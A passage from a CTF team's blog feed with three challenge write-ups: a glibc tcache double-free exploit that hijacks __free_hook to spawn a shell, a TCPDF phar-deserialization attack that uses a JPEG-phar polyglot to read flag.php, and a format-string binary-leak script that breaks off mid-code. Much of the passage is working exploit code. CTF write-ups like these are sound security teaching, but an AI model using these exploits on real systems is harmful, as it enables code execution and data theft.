class="string">'content&gt;&gt;'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'content&gt;&gt;'</span>, content)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = getConn()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        debug([<span class="number">0xBFB</span>,<span class="number">0xD25</span>]) <span class="comment"># add BFB free 0xD25</span></span><br><span class="line"></span><br><span class="line">    add(<span class="string">'A'</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)) <span class="comment"># TO PREVENT double free or corruption (!prev) 1</span></span><br><span class="line">    add(<span class="string">'C'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+p64(<span class="number">0x01</span>)) <span class="comment"># TO PREVENT corrupted size vs. prev_size 2</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">'\x70'</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="string">'\x60'</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="string">'\x60'</span>) <span class="comment"># 2</span></span><br><span class="line">    add(p64(<span class="number">0x0</span>)) <span class="comment"># 3</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">3</span>, p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#edit(1, p16(0x95dd))</span></span><br><span class="line">    edit(<span class="number">3</span>, p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>))</span><br><span class="line">    <span class="comment">#edit(2, '\x60\x07\xdd')#p16(0xb760))</span></span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        edit(<span class="number">2</span>, p16(<span class="number">0xb760</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        edit(<span class="number">2</span>, <span class="string">'\x60\x07\xdd'</span>) <span class="comment"># echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">    add(<span class="string">'A'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">        add(p64(<span class="number">0x0fbad1800</span>)+ <span class="number">3</span>*p64(<span class="number">0</span>) + <span class="string">'\x00'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    r.recv(<span class="number">0x8</span>)</span><br><span class="line">    leak = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    LIBC = leak<span class="number">-0x3ed8b0</span></span><br><span class="line">    SYSTEM = LIBC + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    FREE_HOOK = LIBC + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">    MALLOC_HOOK = LIBC + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">    <span class="keyword">if</span> LIBC &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span> <span class="keyword">or</span> LIBC &amp; <span class="number">0xFFF</span> != <span class="number">0</span>:</span><br><span class="line">        log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    log.success(<span class="string">"0x%x"</span>%leak)</span><br><span class="line">    log.success(<span class="string">"LIBC: 0x%x"</span> % LIBC)</span><br><span class="line">    log.success(<span class="string">"SYSTEM: 0x%x"</span> % SYSTEM)</span><br><span class="line">    log.success(<span class="string">"FREE_HOOK: 0x%x"</span> % FREE_HOOK)</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)) <span class="comment"># 0</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(FREE_HOOK))</span><br><span class="line">    add(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)) <span class="comment"># 1</span></span><br><span class="line">    add(p64(SYSTEM)) <span class="comment"># 4</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'-------------------------------------------------------------------------'</span></span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>Running it<br><a data-fancybox="gallery" href="https://i.imgur.com/PmHDi0B.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/PmHDi0B.png" alt><br></a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;warmup&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;192&lt;/p&gt;
&lt;p&gt;Solvers 43&lt;/p&gt;
&lt;p&gt;attachment：&lt;a href=&quot;h
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Tcache" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"/>
    
      <category term="tcache_dup" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/"/>
    
    
      <category term="double_free" scheme="https://teamrocketist.github.io/tags/double-free/"/>
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="n1ctf2019" scheme="https://teamrocketist.github.io/tags/n1ctf2019/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Chaos Communication Camp 2019 CTF - pdfcreator</title>
    <link href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/"/>
    <id>https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/</id>
    <published>2019-08-25T09:54:28.000Z</published>
    <updated>2019-09-16T01:08:33.636Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Description</strong>:<br>116</p><p>Written by: 0x4d5a</p><p>A pdf conversion service. What could go wrong?</p><p>hax.allesctf.net:3333</p><p><a href="https://mega.nz/#!Gm4GjSxT!w31l60yP_l3EcW7osHu6CfGcTttqhFDt8BgJuAJUP78" target="_blank" rel="noopener">code.zip</a></p></blockquote><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>A website that converts editable content into a pdf, it uses a known tool named tcpdf , since the source code is given lets check its version at <strong>TCPDF/tcpdf.php</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat pdfcreator/TCPDF/tcpdf.php | head -10</span><br><span class="line">&lt;?php</span><br><span class="line">//============================================================+</span><br><span class="line">// File name   : tcpdf.php</span><br><span class="line">// Version     : 6.2.13</span><br><span class="line">// Begin       : 2002-08-03</span><br><span class="line">// Last Update : 2015-06-18</span><br><span class="line">// Author      : Nicola Asuni - Tecnick.com LTD - www.tecnick.com - info@tecnick.com</span><br><span class="line">// License     : GNU-LGPL v3 (http://www.gnu.org/copyleft/lesser.html)</span><br><span class="line">// -------------------------------------------------------------------</span><br><span class="line">// Copyright (C) 2002-2015 Nicola Asuni - Tecnick.com LTD</span><br></pre></td></tr></table></figure><p>The version is <strong>6.2.13</strong> searching online for known vulnerabilities <a href="https://www.cvedetails.com/cve/CVE-2018-17057/" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2018-17057/</a> :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">An issue was discovered in TCPDF before 6.2.22. </span><br><span class="line">Attackers can trigger unserialization of arbitrary data via the phar:// wrapper.</span><br></pre></td></tr></table></figure><p>So it’s possible possible to perform an unserialization attack using <strong>phar://wrapper</strong> wrappers, the deserialization is triggered on functions like <strong>file_exists</strong> (line 164), <strong>getimagesize()</strong> (line 171) and <strong>file_get_contents()</strong> (line 209) in the file <strong>pdfcreator/TCPDF/include/tcpdf_images.php</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.... <span class="comment">// pdfcreator/TCPDF/include/tcpdf_images.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">_parsejpeg</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// check if is a local file</span></span><br><span class="line">    <span class="keyword">if</span> (!@file_exists($file)) &#123;</span><br><span class="line">        <span class="comment">// try to encode spaces on filename</span></span><br><span class="line">        $tfile = str_replace(<span class="string">' '</span>, <span class="string">'%20'</span>, $file);</span><br><span class="line">        <span class="keyword">if</span> (@file_exists($tfile)) &#123;</span><br><span class="line">        $   file = $tfile;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>This unserialization only occurs when using <strong>phar://</strong> wrappers, but we can’t straightly upload a phar file because of the checks presented in <strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.... <span class="comment">// pdfcreator/index.php</span></span><br><span class="line">    $allowed_extensions = <span class="keyword">array</span>(<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($extension, $allowed_extensions)) &#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">"&lt;div class=\"container\"&gt;Invalid image extension!&lt;/div&gt;"</span>);</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br><span class="line">    <span class="comment">//Überprüfung dass das Bild keine Fehler enthält</span></span><br><span class="line">    <span class="keyword">if</span>(function_exists(<span class="string">'exif_imagetype'</span>)) &#123; <span class="comment">//Die exif_imagetype-Funktion erfordert die exif-Erweiterung auf dem Server</span></span><br><span class="line">     $allowed_types = <span class="keyword">array</span>(IMAGETYPE_PNG, IMAGETYPE_JPEG, IMAGETYPE_GIF);</span><br><span class="line">     $detected_type = exif_imagetype($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     <span class="keyword">if</span>(!in_array($detected_type, $allowed_types)) &#123;</span><br><span class="line">     <span class="keyword">echo</span>(<span class="string">"&lt;div class=\"container\"&gt;Only pictures allowed!&lt;/div&gt;"</span>);</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>This checks can be easily bypassed, the first check can easily bypassed by changing filename from exploit.phar to exploit.jpg.</p><p>The second check only checks the header we can easily append to our <strong>phar</strong> file a jpg header before our phar file. The objective is to unserialize a php class that can gives us <strong>RCE</strong> or a <strong>fileread</strong> of file flag.php, there is a good class we can use for this:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pdfcreator/creator.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span></span><br><span class="line">&#123;</span><br><span class="line">include 'TCPDF/tcpdf.php';</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDFCreator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $tmpfile;</span><br><span class="line">   <span class="keyword">public</span> $finalfile;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">   ...</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;tmpfile))</span><br><span class="line">      &#123;</span><br><span class="line">        $info = pathinfo(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">        <span class="keyword">if</span> ($info[<span class="string">'extension'</span>] == <span class="string">"pdf"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Could not delete created PDF: Not a pdf. Check the file: "</span> . file_get_contents(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>We want to trigger functions like <strong>__construct</strong> or <strong>__destruct</strong> after object deserialization, <strong>__construct</strong> is empty so it’s not useful but <strong>__destruct</strong> is! </p><p>It can give us a <strong>file_read</strong> which is enough for what we need, but for this we need to change tmpfile variable to <strong>./flag.php</strong> making the extesion to be diferent from <strong>pdf</strong> reading the file content instead. </p><p>I tried to manually create the phar file but failed miserly, while debugging locally with I was having some troubles passing through the function <strong>getimagesize</strong> due to some errors on jpg signatures eventually I managed to solve the problem but in the end the <strong>function __destruct</strong> was not triggering and I ended up giving up. </p><p>Eventually I found <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a> which can create for us the fake jpg file with the phar embed on it, we just need to create our own template for this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/ambionics/phpggc</span><br><span class="line">$ <span class="built_in">cd</span> phpggc</span><br><span class="line">$ mkdir gadgetchains/Alles/ &amp;&amp; mkdir gadgetchains/Alles/FR &amp;&amp; mkdir gadgetchains/Alles/FR/1</span><br><span class="line">$ cp templates/* gadgetchains/Alles/FR/1/*</span><br></pre></td></tr></table></figure><p>Modifying the <strong>chain.php</strong> at <strong>gadgetchains/Alles/FR/1/</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span> &#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">PDFCreator</span> &#123; <span class="title">public</span> $<span class="title">tmpfile</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\<span class="title">Alles</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">FR1</span> <span class="title">extends</span> \<span class="title">PHPGGC</span>\<span class="title">GadgetChain</span>\<span class="title">FileRead</span> &#123;</span><br><span class="line">        public static $version = '1.00';</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> $vector = <span class="string">'__destruct'</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> $author = <span class="string">'teamrocketist'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">(array $parameters)</span> </span>&#123;</span><br><span class="line">            $a = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">            $a-&gt;tmpfile = $parameters[<span class="string">"remote_file"</span>]; <span class="comment">// file to read</span></span><br><span class="line">            <span class="keyword">return</span> $a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Generating the payload with <strong>phpggc</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg</span><br></pre></td></tr></table></figure></p><p>The option -f uses a technique named <a href="https://github.com/ambionics/phpggc#fast-destruct" target="_blank" rel="noopener">fast destructor</a> to make sure the object deserialized triggers <strong>__destruct</strong>, option <strong>-pj</strong> is to create a jpeg-phar from sample <strong>dummy.jpg</strong>(any valid jpg works) the one I used was this <a href="https://mega.nz/#!qnxylKJQ!QjpxDQP2eOkQGxny-SQ977FCrAp5DTjzNFqfihhPCh4" target="_blank" rel="noopener">one</a>, <strong>-o</strong> option is to specify the output of the payload to a file location.</p><p>After uploading the file make sure you modify the img html tag to use phar:// wrappers:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"phar://./upload/708697c63f7eb369319c6523380bdf7a_6.jpg"</span> <span class="attr">width</span>=<span class="string">"10"</span> <span class="attr">height</span>=<span class="string">"10"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Finally writing a python script to automate this actions:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">files = &#123;<span class="string">'file'</span>: open(<span class="string">'exploit.jpg'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line">url = <span class="string">'http://hax.allesctf.net:3333/index.php'</span></span><br><span class="line">values = &#123;<span class="string">"filename"</span>:<span class="string">"exploit.jpg"</span>, <span class="string">"Content-Disposition"</span>:<span class="string">"form-data"</span>, <span class="string">"Content-Type"</span>:<span class="string">"image/jpeg"</span>&#125;</span><br><span class="line">r = requests.post(url, files=files, data=values)</span><br><span class="line">file_link = re.findall(<span class="string">r'src="(.*)"'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">img = <span class="string">'&lt;img src="phar://./%s" width="10" height="10"&gt;'</span></span><br><span class="line"><span class="keyword">print</span> re.findall(<span class="string">r'ALLES&#123;.*&#125;'</span>, requests.post(url, data=&#123;<span class="string">'pdfcontent'</span>:img%file_link&#125;).text)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>Running and getting the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python webPwn.py</span><br><span class="line">ALLES&#123;phar_jpeg_polyglot_madness_such_w0w&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;116&lt;/p&gt;
&lt;p&gt;Written by: 0x4d5a&lt;/p&gt;
&lt;p&gt;A pdf conversion service. What could go wrong?&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="ccc2019ctf" scheme="https://teamrocketist.github.io/tags/ccc2019ctf/"/>
    
      <category term="unserialization" scheme="https://teamrocketist.github.io/tags/unserialization/"/>
    
      <category term="php" scheme="https://teamrocketist.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] RedpwnCTF - Black Echo</title>
    <link href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-Black-Echo/"/>
    <id>https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-Black-Echo/</id>
    <published>2019-08-17T05:12:40.000Z</published>
    <updated>2019-10-21T18:46:45.982Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Black Echo</p></blockquote><blockquote><p><strong>Description</strong>:<br>413</p><p>Written by: blevy</p><p>You are trapped in a pitch-black cave with no food, water, flashlight, or self-esteem. A faint echo can be heard in the distance.</p><p>nc chall2.2019.redpwn.net 4007</p></blockquote><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>No binary was provided in this challenge, but it was easy to note that there was a format string vulnerability:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nc chall2.2019.redpwn.net 4007</span><br><span class="line">%p</span><br><span class="line">0x1000</span><br></pre></td></tr></table></figure><p>Without the binary we can’t get the got addresses required to leak libc, but we can get the binary from memory, I used an old x86 binary from a previous challenge to check what was the default address:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info proc mappings </span><br><span class="line">process 26806</span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">Start Addr   End Addr       Size     Offset objfile</span><br><span class="line"> 0x8048000  0x8049000     0x1000        0x0 /ctf/redpwn/hardmode/hardmode</span><br><span class="line"> 0x8049000  0x804a000     0x1000        0x0 /ctf/redpwn/hardmode/hardmode</span><br><span class="line"> 0x804a000  0x804b000     0x1000     0x1000 /ctf/redpwn/hardmode/hardmode</span><br><span class="line">0xf7db4000 0xf7f8b000   0x1d7000        0x0 /lib/i386-linux-gnu/libc-2.28.so</span><br><span class="line">0xf7f8b000 0xf7f8c000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.28.so</span><br><span class="line">0xf7f8c000 0xf7f8e000     0x2000   0x1d7000 /lib/i386-linux-gnu/libc-2.28.so</span><br><span class="line">0xf7f8e000 0xf7f8f000     0x1000   0x1d9000 /lib/i386-linux-gnu/libc-2.28.so</span><br><span class="line">0xf7f8f000 0xf7f92000     0x3000        0x0 </span><br><span class="line">0xf7fcd000 0xf7fcf000     0x2000        0x0 </span><br><span class="line">0xf7fcf000 0xf7fd2000     0x3000        0x0 [vvar]</span><br><span class="line">0xf7fd2000 0xf7fd4000     0x2000        0x0 [vdso]</span><br><span class="line">0xf7fd4000 0xf7ffb000    0x27000        0x0 /lib/i386-linux-gnu/ld-2.28.so</span><br><span class="line">0xf7ffc000 0xf7ffd000     0x1000    0x27000 /lib/i386-linux-gnu/ld-2.28.so</span><br><span class="line">0xf7ffd000 0xf7ffe000     0x1000    0x28000 /lib/i386-linux-gnu/ld-2.28.so</span><br><span class="line">0xfffdd000 0xffffe000    0x21000        0x0 [stack]</span><br></pre></td></tr></table></figure><p>We can start leaking from <strong>0x8049000</strong> until <strong>0x804b000</strong>, the starting of <strong>0x8048000</strong>-<strong>0x8049000</strong> is just a repetition from <strong>0x8049000</strong>-<strong>0x804a000</strong>, there is also something you should worry about, addresses that contains 0x0a (new line ‘\n’) bytes can’t be leaked, because the function used to read is <strong>fgets</strong> and it stops reading when it encounters new lines, in this cases I just insert a null byte, in the end is expected the binary to be slightly corrupted. If you want more details liveoverflow did a video about an identical challenge on his youtube channel around 2017 you can visit at <a href="https://www.youtube.com/watch?v=XuzuFUGuQv0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=XuzuFUGuQv0</a></p><p>The code to leak the binary:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">binary = <span class="string">''</span></span><br><span class="line">out = <span class="string">''</span></span><br><span class="line">x=0x8049000</span><br><span class="line"><span class="keyword">while</span> x &lt; 0x8049000+0x2000:</span><br><span class="line">address = <span class="string">"0%x"</span> % x</span><br><span class="line">length = 0</span><br><span class="line"><span class="built_in">print</span> address</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="string">'\n'</span> <span class="keyword">in</span> binascii.unhexlify(address)):</span><br><span class="line"><span class="comment">#length = 1</span></span><br><span class="line">out = <span class="string">'a'</span></span><br><span class="line">binary += <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.sendline(<span class="string">"%9<span class="variable">$s</span>"</span>+<span class="string">"||||"</span>+p32(x))</span><br><span class="line">out = r.recvuntil(<span class="string">'||||'</span>)</span><br><span class="line"><span class="built_in">print</span> out</span><br><span class="line">r.recv(timeout=1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span 